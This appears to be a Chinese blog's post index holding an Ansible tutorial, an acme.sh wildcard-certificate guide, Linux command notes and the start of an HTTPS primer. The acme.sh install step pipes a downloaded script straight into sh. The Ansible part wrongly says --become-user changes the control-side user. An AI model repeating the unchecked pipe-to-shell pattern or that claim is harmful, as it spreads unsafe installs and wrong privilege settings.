被控端\n\n  要安装 python, 并且能被控制端 ssh \n\n<!-- more -->\n\n### 2. ansible 配置\n\nansible的默认配置文件路径为 /etc/ansible，然而，一个常见的用途是将其安装在一个virtualenv中，在这种情况下，我们一般不会使用这些默认文件。我们可以根据需要在本地目录中创建配置文件。\n\n##### 2.1 inventory文件\n\n您可以创建一个inventory文件，用于定义将要管理的服务器。这个文件可以命名为任何名字，但我们通常会命名为hosts或者项目的名称。 \n\n在hosts文件中，我们可以定义一些要管理的服务器。这里我们将定义我们可能要在“web”标签下管理的两个服务器。标签是任意的。\n\n```bash\n[web]\n192.168.22.10\n192.168.22.11\n```\n\n现在，让我们将hosts文件设置为指向本地主机local和remote虚拟远程主机。 \n\n```bash\n[local]\n127.0.0.1\n\n[remote]\n192.168.1.2\n```\n\n### 3. ansible 使用\n\n我们开始对服务器运行任务。ansible会假定你的服务器具有ssh访问权限，通常基于ssh-key。因为ansible使用ssh，所以它需要能够ssh连接到服务器。但是，ansible将尝试以正在运行的当前用户身份进行连接。如果我正在运行ansible的用户是ubuntu，它将尝试以ubuntu连接其他服务器。\n\nNote: 控制端和被控端的用户很显然会不一样。\n\n```bash\nwhoami # levonfly\n\nansible -i ./hosts --connection=local local -m ping\n127.0.0.1 | SUCCESS => {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n\n\nansible -i ./hosts remote -m ping\n192.168.1.2 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: ssh: connect to host 192.168.1.2 port 22: Operation timed out\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n\n\n+ 使用–connection=local告诉ansible不尝试通过ssh运行命令，因为我们只是影响本地主机。但是，我们仍然需要一个hosts文件，告诉我们连接到哪里。 \n\n+ 在任何情况下，我们可以看到从ansible得到的输出是一些json，它告诉我们task（我们对ping模块的调用）是否进行了任何更改和结果。\n\n\n\n命令说明：\n\n```bash\n-i ./hosts \t\t\t\t# 设置库存文件，命名为 hosts\nremote，local，all # 使用这个标签的下定义的服务器hosts清单文件。“all”是针对文件中定义的每个服务器运行的特殊关键字, 注意all比较特殊\n-m ping # 使用“ping”模块，它只是运行ping命令并返回结果\n-c local| --connection=local # 在本地服务器上运行命令，而不是SSH\n\n一些常用命令：\n-i PATH --inventory=PATH # 指定host文件的路径，默认是在/etc/ansible/hosts\n--private-key=PRIVATE_KEY_FILE_PATH # 使用指定路径的秘钥建立认证连接\n-m DIRECTORY --module-path=DIRECTORY #指定module的目录来加载module，默认是/usr/share/ansible\n-c CONNECTION --connection=CONNECTION #指定建立连接的类型，一般有ssh ，local\n```\n\n\n\n##### 3.1 模块（modules）\n\nansible使用“模块”来完成大部分的任务。模块可以做安装软件，复制文件，使用模板等等。\n\n如果我们没有模块，我们将运行任意的shell命令，我们也可以使用bash脚本。这是一个任意shell命令看起来像在ansible（它使用的shell模块！）：\n\n```bash\n# 在本地执行ls命令\nansible -i ./hosts local --connection=local -m shell -a 'ls'\n\n127.0.0.1 | SUCCESS | rc=0 >>\nREADME.md\nhosts\nnginx.yml\nroles\n\n# 在远程安装nginx, 注意--become-user=root是改变控制端的用户, 不是被控端\nansible -i ./hosts remote -b --become-user=root -m shell -a 'yum install nginx'\n172.24.120.46 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: liuwei@172.24.120.46: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n命令说明:\n\n```bash\n-b # “成为”，在运行命令时告诉可以成为另一个用户。\n--become-user=root # 以用户“root”运行以下命令, 是改变控制端的用户, 不是被控端!!!\n\n-a #用于将任何参数传递给-m定义的模块\n```\n\n\n\n要在centos服务器上安装软件，“yum”模块将运行相同的命令，但确保幂等。\n\n```bash\n# 指定root用户yum安装nginx\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u root -k\n\nNo config file found; using defaults\nSSH password: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n\n\n# 指定普通用户yum安装nginx, 并且输入sudo密码\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u liuwei -k -s -K \nSSH password: xxx\nSUDO password[defaults to SSH password]: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n```\n\n命令说明:\n\n```bash\n-v   \t # verbose mode, (-vvv for more, -vvvv to enable connection debugging)\n-m apt # 使用apt模块\n-a 'name=nginx state=installed update_cache=true' # 提供apt模块的参数，包括软件包名称，所需的结束状态以及是否更新软件包存储库缓存\n\n常用命令：\n-u USERNAME | --user=USERNAME #指定被控端的执行用户\n-k | --ask-pass  #提示输入ssh的密码，而不是使用基于ssh的密钥认证\n\n-s | --sudo  #指定用户的时候，使用sudo获得root权限\n-K | --ask-sudo-pass #提示输入sudo密码，与--sudo一起使用\n```\n\n这将使用yum模块来更新存储库缓存并安装nginx（如果没有安装）。 运行任务的结果是”changed”: false。这表明没有变化; 我已经使用该shell模块安装了nginx 。好的是，我可以一遍又一遍地运行这个命令，而不用担心它会改变预期的结果 - nginx已经安装，ansible知道，并且不尝试重新安装它。 \n\n\n\n##### 3.2 剧本（playbooks）\n\nplaybook可以运行多个任务，并提供一些更高级的功能。让我们将上述任务移到一本剧本中。在ansible中剧本（playbooks）和角色（roles）都使用yaml文件定义。 \n\nnginx.yml：(通过yaml写所需参数)\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n```\n\n\n\n这将使用inventory文件中[remote]标签下的服务器hosts。在我们的tasks文件中使用become并become_user再次使用ansible来sudo以root用户身份运行命令，然后传递playbook文件。使用一个yaml playbook文件，我们需要使用这个ansible-playbook命令：\n\n\n\n```bash\nansible-playbook -i ./hosts nginx.yml -k -K\nSSH password:\nSUDO password[defaults to SSH password]:\n\nPLAY [remote] ***************************************************************************************************************************************************************************\n\nTASK [Gathering Facts] ******************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nTASK [Install Nginx] ********************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nPLAY RECAP ******************************************************************************************************************************************************************************\n172.24.120.46              : ok=2    changed=0    unreachable=0    failed=0\n```\n\n我们在运行过程中获得了一些有用的反馈，包括“可执行任务”运行及其结果。在这里我们看到所有运行都ok，但没有改变。\n\n\n\n##### 3.3 处理程序（handlers）\n\n处理程序与任务完全相同（它可以做task可以做的任何事），但只有当另一个任务调用它时才会运行。您可以将其视为事件系统的一部分; 处理程序将通过其侦听的事件调用进行操作。 这对于运行任务后可能需要的“辅助”操作非常有用，例如在配置更改后安装或重新加载服务后启动新服务。\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n     notify: #复制的时候, 要注意空格, 对齐\n      - Start Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n```\n\n这里我们添加一个notify指令到安装任务。这将在任务运行后通知名为“Start Nginx”的处理程序。然后我们可以创建名为“Start Nginx”的处理程序。此处理程序是通知“Start Nginx”时调用的任务。 这个特定的处理程序使用服务模块，它可以启动，停止，重启，重新加载（等等）系统服务。在这种情况下，我们告诉ansible，我们要启动Nginx。 \n\n+ 如果我已经安装了nginx，则安装nginx任务将不会运行，通知程序也将不会被调用。\n\n\n\n##### 3.4 更多的任务（more tasks）\n\n接下来，我们可以为此playbook添加更多的任务，并探索其他一些功能。\n\n```yaml\n- hosts: local\n  connection: local\n  become: yes\n  become_user: root\n  vars:\n   - docroot: /var/www/serversforhackers.com/public\n  tasks:\n   - name: Add Nginx Repository\n     apt_repository:\n       repo: ppa:nginx/stable\n       state: present\n     register: ppastable\n\n   - name: Install Nginx\n     apt:\n       pkg: nginx\n       state: installed\n       update_cache: true\n     when: ppastable|success\n     notify:\n      - Start Nginx\n\n   - name: Create Web Root\n     file:\n      path: '{{ docroot }}'\n      mode: 775\n      state: directory\n      owner: www-data\n      group: www-data\n     notify:\n      - Reload Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n\n    - name: Reload Nginx\n      service:\n        name: nginx\n        state: reloaded\n```\n\n现在有三个任务：\n\n```bash\nAdd Nginx Repository # 使用apt_repository模块添加Nginx稳定PPA以获取最新的稳定版本的Nginx 。\nInstall Nginx \t\t   # 使用apt模块安装Nginx。\nCreate Web Root      # 最后创建一个Web根目录。\n```\n\n新的register和when指令，可以实现在某些事情发生后让ansible执行任务的功能。\n\n您还可以注册模块操作的结果，并使用定义的变量根据注册（register）的变量值有条件（when）地执行操作。例如，注册通过shell模块运行命令的结果可以让您访问该命令的stdout。\n\n同时还使用了一个变量, docroot变量在定义vars部分。然后将其用作创建定义目录的文件模块的目标参数。需要注意的是，path配置使用括号{{ var-name }}，这是Jinja2的模板。为了使ansible能够在括号内解析Jinja2模板变量，该行必须是单引号或双引号 - 例如，path: '{{ docroot }}' 而不是path: {{ docroot }}。不使用引号将导致错误。 这个playbook可以用通常的命令运行：\n\n```\nansible-playbook -i ./hosts nginx.yml\n```\n\n\n\n### 4. ansible角色（roles）\n\n角色才是ansible的精髓, 每个人可以做出自己的角色让别人使用, 也可以通过ansible-galaxy安装其他人的角色。\n\n角色很适合组织多个相关任务并封装完成这些任务所需的数据。例如，安装nginx可能涉及添加软件包存储库，安装软件包和设置配置。 \n\n此外，真实的配置通常需要额外的数据，如变量，文件，动态模板等等。这些工具可以与Playbook一起使用，但是我们可以通过将相关任务和数据组织成一个角色（role， 相关的结构）很快就能做得更好。 \n\n角色有一个这样的目录结构：\n\n```\nroles\n  rolename\n   - files\n   - handlers\n   - meta\n   - templates\n   - tasks\n   - vars\n```\n\n在每个子目录中（eg： files，handlers等等），ansible将自动搜索并读取叫做main.yml的yaml文件。 \n\n接下来我们将分解nginx.yml文件内容为不同的组件，并将每个组件放在相应的目录中，以创建一个更干净，更完整的配置工具集。\n\n\n\n##### 4.1 创建角色（creating a role）\n\n我们可以使用ansible-galaxy命令来创建一个新角色。此工具可用于将角色保存到ansible的公共注册表，但是我通常只是使用它来在本地创建role的基础目录结构。\n\n```bash\ncd ~/ansible-example\nmkdir roles\ncd roles\nansible-galaxy init nginx\n```\n\n目录名称roles是一种惯例，在运行一个playbook时可以用来查找角色。该目录应该始终被命名roles，但并不强制。在roles目录中运行 ansible-galaxy init nginx 命令将创建新角色所需的目录和文件。\n\n我们来看看我们新建的nginx角色的每个部分~/ansible-example/roles/nginx。\n\n##### 4.2.1 文件（files）\n\nfiles目录中没有main.yml文件.  首先，在files目录中，我们可以添加我们要复制到我们的服务器中的文件。对于nginx，我经常复制h5bp的nginx组件配置。我只需从github下载最新的信息，进行一些调整，并将它们放入files目录中。\n\n```\n~/ansible-example\n - roles\n - - nginx\n - - - files\n - - - - h5bp\n```\n\n我们稍后会看到，h5bp配置文件将通过复制模块添加到服务器。\n\n\n\n##### 4.2.2 处理程序（handlers）\n\nhandlers约定必须包含main.yml文件。我们可以把曾经在nginx.yml 剧本中的定义的所有处理程序放入到handlers目录中。\n\nhandlers/main.yml 内容：\n\n```yml\n---\n# handlers file for nginx\n\n- name: Start Nginx\n  service:\n    name: nginx\n    state: started\n\n- name: Reload Nginx\n  service:\n    name: nginx\n    state: reloaded\n```\n\n一旦handlers/main.yml中的处理程序定义好了，我们可以自由地从其他的yaml配置中引用它们。\n\n\n\n##### 4.2.3 元（meta）\n\nmeta目录中约定必须包含main.yml文件。main.yml文件包含role元数据，包含的依赖关系。如果这个角色依赖于另一个角色，我们可以在这里定义。例如，nginx角色取决于安装ssl证书的ssl角色。 \n\nmeta/main.yml 内容：\n\n```yml\n---\ndependencies:\n  - { role: ssl }\n```\n\n如果我调用了“nginx”角色，它将尝试首先运行“ssl”角色。 否则我们可以省略此文件，或将角色定义为没有依赖关系：\n\n```yml\n---\ndependencies: []\n```\n\n\n\n##### 4.2.4 模板（templates）\n\ntemplates目录中没有main.yml文件，只包含.j2后缀的模板文件。 基于python的Jinja2模板引擎（和django的模板引擎很类似），模板文件可以包含模板变量。这里的文件应该以.j2为类型后缀（eg.uwsgi.j2），提倡但是不强制，也可以取其他的名字。\n\n这是一个nginx服务器（“虚拟主机”）配置的例子。请注意，它使用了稍后在vars/main.yml文件中定义的一些变量。 我们的示例中的nginx配置文件位于templates/serversforhackers.com.conf.j2：\n\n```nginx\nserver {\n    # Enforce the use of HTTPS\n    listen 80 default_server;\n    server_name {{ domain }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl default_server;\n\n    root /var/www/{{ domain }}/public;\n    index index.html index.htm index.php;\n\n    access_log /var/log/nginx/{{ domain }}.log;\n    error_log  /var/log/nginx/{{ domain }}-error.log error;\n\n    server_name {{ domain }};\n\n    charset utf-8;\n\n    include h5bp/basic.conf;\n\n    ssl_certificate           {{ ssl_crt }};\n    ssl_certificate_key       {{ ssl_key }};\n    include h5bp/directive-only/ssl.conf;\n\n    location / {\n        try_files $uri $uri/ /index.php$is_args$args;\n    }\n\n    location = /favicon.ico { log_not_found off; access_log off; }\n    location = /robots.txt  { log_not_found off; access_log off; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi.conf;\n        fastcgi_pass unix:/var/run/php7.1-fpm.sock;\n    }\n}\n```\n\n这是一个相当标准的用于php应用程序的Nginx配置。这里有三个变量：`domain` `ssl_crt` `ssl_key` 这三个变量将在变量部分（vars）中定义。\n\n##### 4.2.5 变量（vars）\n\nvars目录包含一个main.yml文件, 在main.yml中我们可以列出将要使用的所有变量。 \n\nvars/main.yml：\n\n```yml\n---\ndomain: serversforhackers.com\nssl_key: /etc/ssl/sfh/sfh.key\nssl_crt: /etc/ssl/sfh/sfh.crt\n```\n\n+ Note:如果您有敏感信息添加到变量文件中，则可以使用ansible-vault加密文件。\n\n\n\n##### 4.2.6 任务（tasks）\n\ntasks目录包含一个main.yml文件, 使用角色时运行的主文件是tasks/main.yml文件。看看我们的用例将会是什么样的：\n\n```yml\n---\n- name: Add Nginx Repository\n  apt_repository:\n    repo: ppa:nginx/stable\n    state: present\n\n- name: Install Nginx\n  apt:\n    pkg: nginx\n    state: installed\n    update_cache: true\n  notify:\n    - Start Nginx # 在handler文件夹里\n\n- name: Add H5BP Config\n  copy:\n    src: h5bp\n    dest: /etc/nginx\n    owner: root\n    group: root\n\n- name: Disable Default Site Configuration\n  file:\n    dest: /etc/nginx/sites-enabled/default\n    state: absent\n\n# `dest` in quotes as a variable is used!\n- name: Add SFH Site Config\n  register: sfhconfig\n  template:\n    src: serversforhackers.com.j2\n    dest: '/etc/nginx/sites-available/{{ domain }}.conf' \n    owner: root\n    group: root\n\n# `src`/`dest` in quotes as a variable is used!\n- name: Enable SFH Site Config\n  file:\n    src: '/etc/nginx/sites-available/{{ domain }}.conf'\n    dest: '/etc/nginx/sites-enabled/{{ domain }}.conf'\n    state: link\n\n# `dest` in quotes as a variable is used!\n- name: Create Web root\n  file:\n    dest: '/var/www/{{ domain }}/public'\n    mode: 775\n    state: directory\n    owner: www-data\n    group: www-data\n  notify:\n    - Reload Nginx\n\n# `dest` in quotes as a variable is used!\n- name: Web Root Permissions\n  file:\n   dest: '/var/www/{{ domain }}'\n   mode: 775\n   state: directory\n   owner: www-data\n   group: www-data\n   recurse: yes\n  notify:\n    - Reload Nginx\n```\n\n这一系列任务使得nginx能被完整的安装。任务按照出现的顺序完成以下工作：\n\n```\n1 添加nginx / stable库\n2 安装并启动nginx\n3 添加H5BP配置文件\n4 从sites-enabled目录中删除文件的符号链接来禁用默认的nginx配置\n5 将serversforhackers.com.conf.j2虚拟主机模板复制到nginx配置中，渲染模板\n6 通过将其符号链接到sites-enabled目录来启用Nginx服务器配置\n7 创建Web根目录\n8 更改项目根目录的权限（递归），该目录位于之前创建的Web根目录之上\n```\n\n有一些新的模块（和一些我们已经涵盖的新用途），包括复制，模板和文件模块。通过设置每个模块的参数，我们可以做一些有趣的事情，例如确保文件“不存在”（如果存在则删除它们）的state: absent，或者通过创建一个文件作为符号链接的state: link。您应该检查每个模块的文档，以查看可以用它们完成哪些有趣和有用的事情。\n\n参加官方文档: https://docs.ansible.com/ansible/latest/modules/\n\n\n\n##### 4.3 运行角色（running the Role）\n\n要对服务器运行一个或多个角色，我们将重新使用另一个playbook。该playbook与roles目录位于同一个目录中，同一层级。当我们用ansible-playbook命令运行的时候需要先cd进入到该目录中。 \n\n让我们创建一个“主”的yaml文件（被ansible-playbook命令执行的文件），该文件定义要使用的角色以及运行它们的主机： 文件~/ansible-example/server.yml位于与roles目录相同的目录中：(注意是和roles目录同层级!!!!!)\n\n```yml\n---\n- hosts: local\n  connection: local\n  roles:\n    - nginx # 这个是你刚才写的nginx role\n```\n\n所以，我们只是定义角色，而不是在本playbook文件中定义所有的变量和任务。角色负责具体细节。然后我们可以运行角色：\n\n```bash\nansible-playbook -i ./hosts server.yml\n```\n\n以下是运行nginx角色的playbook文件的输出：\n\n```bash\nPLAY [all] ********************************************************************\n\nGATHERING FACTS ***************************************************************\nok: [127.0.0.1]\n\nTASK: [nginx | Add Nginx Repository] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Install Nginx] *************************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add H5BP Config] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Disable Default Site] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add SFH Site Config] *******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Enable SFH Site Config] ****************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Create Web root] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Web Root Permissions] ******************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Start Nginx] ***********************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Reload Nginx] **********************************************\nchanged: [127.0.0.1]\n\nPLAY RECAP ********************************************************************\n127.0.0.1                  : ok=8   changed=7   unreachable=0    failed=0\n```\n\n我们将所有各种组件放在一起，形成一致的角色，现在已经安装并配置了nginx！\n\n\n\n### 5. ansible事实(facts)\n\n请注意，运行剧本时的第一行总是“收集事实”。 在运行任何任务之前，ansible将收集有关其配置的系统的信息。这些被称为事实，并且包括广泛的系统信息，如CPU核心数量，可用的ipv4和ipv6网络，挂载的磁盘，Linux发行版等等。\n\n事实在“任务”或“模板”配置中通常很有用。例如，nginx通常设置为使用与cpu内核一样多的工作处理器。知道这一点，您可以选择如下设置nginx.conf.j2文件的模板：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n或者如果你具有多个cpu的服务器，则可以使用：\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores * ansible_processor_count }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\n所有的ansible facts全局变量都是以“anisble_”为前缀，并且可以在其他任何地方使用。 尝试对你的本地机器运行以下内容以查看可用的事实：\n\n```bash\n# Run against a local server\n# Note that we say to use \"localhost\" instead of defining a hosts file here!\nansible -m setup --connection=local localhost\n\n# Run against a remote server\nansible -i ./hosts remote -m setup\n```\n\n\n\n### 6. ansible遇到的问题总结\n\n+ 遇到角色没有的问题, ERROR! the role 'Stouts.ntp' was not found\n\n  通过ansible-galaxy安装 \n\n  ```\n  ansible-galaxy install stouts.ntp\n  ```\n\n+ ansible的全局配置ansible.cfg\n\n  如默认是否需要输入密码、是否开启sudo认证、action_plugins插件的位置、hosts主机组的位置、是否开启log功能、默认端口、key文件位置等等。\n  \n  参见: https://www.cnblogs.com/paul8339/p/6159220.htm\n\n+ host文件把一个组作为另一个组的子成员 \n\n  ```\n  [atlanta]\n  host1\n  host2\n  \n  [raleigh]\n  host2\n  host3\n  \n  [southeast:children]\n  atlanta\n  raleigh\n  \n  [southeast:vars]\n  some_server=foo.southeast.example.com\n  halon_system_timeout=30\n  self_destruct_countdown=60\n  escape_pods=2\n  \n  [usa:children]\n  southeast\n  northeast\n  southwest\n  northwest\n  ```\n\n  atlanta raleigh将作为southeast子组，继承父组southeast中some_server等变量\n\n  \n\n+ 限制脚本只在指定的ip对应的机器上执行。\n\n   -l <SUBSET>, --limit <SUBSET>\n   \n\t```bash\n   ansible-playbook myplaybook.yml -l 10.11.12.13\n   ```\n\n\n\n+ 打标签归类, 指定归类相关的task\n\n  ```yml\n  ---\n  - include: restart.yml\n    tags:\n      - tag2\n  - include: push.yml\n    tags:\n      - tag1\n  ```\n\n  tags主要目的是单独执行指定的tag，使用-t 或者--tags 表示。旧版本不是这样写的，会直接在include后面加上tags=xxx,但是在新版本的ansible执行时虽然不报错，但是也不执行该tag。\n\n\n\n### 7. 参考资料\n\n+ [非常好的Ansible入门教程（超简单）](https://blog.csdn.net/pushiqiang/article/details/78126063)\n\n+ [Ansible 快速入门](https://www.cnblogs.com/dachenzi/p/8916521.html)\n\n+ [ansible自动化运维教程](https://www.w3cschool.cn/automate_with_ansible/ )\n\n+ https://docs.ansible.com/ansible/latest/modules/ 官方文档 \n\n  \n\n","tags":["ansible"],"categories":["系统"]},{"title":"acme.sh自动更新阿里云aliyun获取Let's Encrypt wildcard通配符SSL证书","url":"%2Fp%2Fee822cec.html","content":"\n\n\n### 1. 证书类型\n\n+ 目前主流的SSL证书主要分为DV SSL(域名型) 、 OV SSL(组织型) 、EV SSL(增强型)。\n\n![1](acme.sh/1.png)\n\n<!-- more -->\n\n+ DV、OV、EV证书在浏览器中显示的区别\n\nDV类型仅在浏览器显示一个小锁，OV和EV类型证书都包含了企业名称信息，但是，EV证书采用了更加严格的认证标准，浏览器在访问时，会在地址栏显示公司名称，地址栏变成绿色。绿的更加让人信任。\n\n![1](acme.sh/2.png)\n\n\n\n### 2. ACME协议\n\nACME全称The Automatic Certificate Management Environment，而[acme.sh](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FNeilpang%2Facme.sh)这个库，则能够在Linux上实现如下功能：\n\n1. 自动向Let's Encrypt申请证书；\n2. 自动调用各大云平台的api接口实现TXT解析配置；\n3. 证书下发后自动部署到nginx；\n4. 利用定时器，每60天自动更新证书，并完成自动部署。\n\n\n\n### 3. 配置证书\n\n##### 3.1 安装acme.sh\n\n```bash\ncurl https://get.acme.sh | sh\n```\n\n这个自动安装过程完成了以下几个步骤：\n\n1. 拷贝sh脚本到~/.acme.sh/\n2. 创建alias别名acme.sh=~/.acme.sh/acme.sh   (`source ~/.bashrc`一下)\n3. 启动定时器 . 可以通过`crontab -l`查看\n\n\n\n##### 3.2 dns验证并安装部署\n\nacme.sh 实现了 acme 协议支持的所有验证协议. 一般有两种方式验证: http 和 dns 验证. 接下来我们说下 dns的验证.\n\n+ 去阿里的控制台找到Ali_Key, Ali_Secret, 执行下面命名\n\n  ```bash\n  export Ali_Key=\"xxxxxxxx\" \n  export Ali_Secret=\"xxxxxxxx\"\n  ```\n\n+ 生成泛域名证书\n\n  ```bash\n  acme.sh --issue -d \"*.liuvv.com\" --dns dns_ali\n  ```\n  在`~/.acme`文件里生成了`*.liuvv.com` 文件夹\n\n+ 配置nginx\n\n  ```nginx\n  server {\n          listen 80 default_server;\n          listen [::]:80 default_server;\n          rewrite ^ https://$http_host$request_uri? permanent; #https跳转到https,永久重定向\n  }\n  \n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n  \n          ssl_certificate \"/etc/nginx/ssl/fullchain.cer\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com.key\";\n  \n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n+ 安装证书\n\n  ```bash\n  sudo ./acme.sh  --installcert  -d  *.liuvv.com   \\\n          --key-file   /etc/nginx/ssl/*.liuvv.com.key \\\n          --fullchain-file /etc/nginx/ssl/fullchain.cer \\\n          --reloadcmd  \"service nginx force-reload\"\n  ```\n\n  + 这里用的是 `service nginx force-reload`, 不是 `service nginx reload`, 据测试, `reload` 并不会重新加载证书, 所以用的 `force-reload`\n  + nginx 的配置 `ssl_certificate` 使用 `/etc/nginx/ssl/fullchain.cer` ，而非 `/etc/nginx/ssl/<domain>.cer` ，否则 [SSL Labs](https://www.ssllabs.com/ssltest/) 的测试会报 `Chain issues Incomplete` 错误。\n\n+ 重新生成证书\n\n  ```bash\n  sudo ./acme.sh --renew -d *.liuvv.com --force\n  ```\n\n  通过这个命令,观看是否自动部署, 并观察证书的到期时间.\n\n\n\n### 4. 参考资料\n\n+ [https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E](https://github.com/Neilpang/acme.sh/wiki/说明)\n\n+ https://www.mustu.cn/acme-shhuo-qu-lets-encrypt-wildcardtong-pei-ssl/\n\n+ https://www.jianshu.com/p/a9f2088e099c\n\n+ https://deepzz.com/post/acmesh-letsencrypt-cert-auto-renew.html","tags":["acme.sh"],"categories":["https"]},{"title":"linux常用命令总结","url":"%2Fp%2F1d063ae7.html","content":"\n\n\n### 查看linux系统版本\n\n```bash\nlsb_release -a \n\nuname -srm  \n\ncat /etc/os-release\n\ncat /proc/version\n\ncat /etc/issue\n```\n\n<!-- more -->\n\n### 设置linux时间和时区\n\n```bash\n# 设置时间\ndate -s \"2015-10-25 15:00:00\"\n\n#设置时区\ntzselect  #命令只告诉你选择的时区的写法，并不会生效。\n在.bashrc添加  export TZ='Asia/Shanghai'\n```\n\n\n\n### 域名查询\n\n```bash\nhost hostname [server]\n[server]：使用不是由/etc/resolv.conf文件定义的DNS服务器IP来查询某台主机的IP。\n\nhost www.baidu.com\nhost www.baidu.com 8.8.8.8\n\nhost google.com #Find the Domain IP Address\nhost -t ns google.com #Find Domain Name Servers, dns\nhost -t cname mail.google.com #Find Domain CNAME Record\nhost -t mx google.com #Find Domain MX Record\nhost -t txt google.com#Find Domain TXT Record\nhost -a google.com #Find All Information of Domain Records and Zones\n```\n\n\n\n### 观察硬盘实体使用情况\n\n```bash\nfdisk -l  #查看Linux中的所有磁盘分区\n\nfdisk -l /dev/sda #查看特定磁盘分区\n\nfdisk /dev/sda #输入m里面有各种操作\n```\n\n\n\n### 查询端口\n\n```bash\n#1. 这类命令一定要用sudo\n#2. a: all p: procee, t:tcp, u:udp, l:正在监听的 , n: 禁止域名解析, 只显示数字ip\nsudo netstat -anp | grep 80\nsudo netstat -tunlp | grep 80\n\n\n# 知道进程名字反查端口\nps -ef | grep processName  #得到processID\nnetstat -anp | grep processID #p能显示出进程名和进程id, 过滤得到端口\n\n# 知道端口反查进程名字\nsudo lsof -i :80\n\n# 一个命令搞定\nsudo netstat -anp | grep processID\nsudo netstat -anp | grep processName\n```\n\n\n\n### 查询进程\n\n```bash\nps     # displays processes for the current shell.\nps -ef # Display every active process on a Linux system in generic (Unix/Linux) format.\nps -aux # Display all processes in BSD format.\n```\n\n\n\n\n\n### 参考教程\n\n+ [https://www.tecmint.com](https://www.tecmint.com/) 这个网站举例命令的例子\n+ https://github.com/me115/linuxtools_rst","tags":["linux"],"categories":["命令"]},{"title":"https协议简介,网站支持https, golang启动https","url":"%2Fp%2Ffcd8becb.html","content":"\n\n### 1. https 协议简介\n\nHTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输。\n\n> SSL历史和版本\n\n1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。\n\n1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。\n\n1996年，SSL 3.0版问世，得到大规模应用。\n\n1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版。\n\n2006年和2008年，TLS进行了两次升级，分别为TLS 1.1版和TLS 1.2版。最新的变动是2011年TLS 1.2的修订版。\n\n\n目前，应用最广泛的是TLS 1.0，接下来是SSL 3.0。但是，主流浏览器都已经实现了TLS 1.2的支持。\n\n---\nTLS 1.0通常被标示为SSL 3.1\n\nTLS 1.1为SSL 3.2，\n\nTLS 1.2为SSL 3.3。\n\n<!-- more -->\n\n\n### 2. https 非对称加密和数字证书\n\n+ HTTPS的数据传输是加密的。实际使用中，HTTPS利用的是对称与非对称加密算法结合的方式。\n\n+ 对称加密，就是通信双方使用一个密钥，该密钥既用于数据加密（发送方），也用于数据解密（接收方）。\n\n+ 非对称加密，使用两个密钥。发送方使用公钥（公开密钥）对数据进行加密，数据接收方使用私钥对数据进行解密。\n\n+ 实际操作中，单纯使用对称加密或单纯使用非对称加密都会存在一些问题，比如对称加密的密钥管理复杂；非对称加密的处理性能低、资源占用高等，因 此HTTPS结合了这两种方式。\n\n+ HTTPS服务端在连接建立过程（ssl shaking握手协议）中，会将自身的公钥发送给客户端。客户端拿到公钥后，与服务端协商数据传输通道的对称加密密钥-对话密钥，随后的这个协商过程则 是基于非对称加密的（因为这时客户端已经拿到了公钥，而服务端有私钥）。\n\n+ 